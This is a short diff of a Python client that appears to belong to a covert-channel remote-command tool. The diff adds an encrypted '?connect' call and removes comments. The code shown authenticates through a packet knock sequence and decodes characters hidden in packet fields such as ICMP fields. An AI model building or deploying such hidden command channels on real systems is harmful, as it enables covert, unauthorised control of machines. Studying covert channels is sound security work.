@@ -15,7 +15,6 @@ interface = ""
 
 def startClient(serverIP, proto, intf):
 	# check if you can connect?
-	# start the recieving thread
 	global server
 	global protocol
 	global interface
@@ -27,6 +26,8 @@ def startClient(serverIP, proto, intf):
 	listenThread = threading.Thread(target=recvThread)
 	listenThread.daemon = True
 	listenThread.start()
+
+	sendCommand(utils.encryptData("?connect"))
 
 	# wait for commands
 	while(client.running):
@@ -58,10 +59,6 @@ def recvThread():
 
 def authenticated(packet):
 	global knockVal
-	# start a timer, or check if it's running
-		# if the timer expired, no auth
-	# if it fits the knock code, add one to a value
-	# if the value == to the total knock code, authenticate
 	if knockVal < len(config.knock):
 		if packet[3] == config.knock[knockVal]:
 			knockVal += 1
@@ -90,7 +87,6 @@ def checkResult(ip, proto, data, pacType):
 	elif pacType == 'icmp':
 		character = proto[2]
 
-	# here is where I'll actually be printing the results
 	if character < 256:
 		character = utils.decryptData(character)
 		if ord(character) > 31 and ord(character) < 127 or character == '\n':
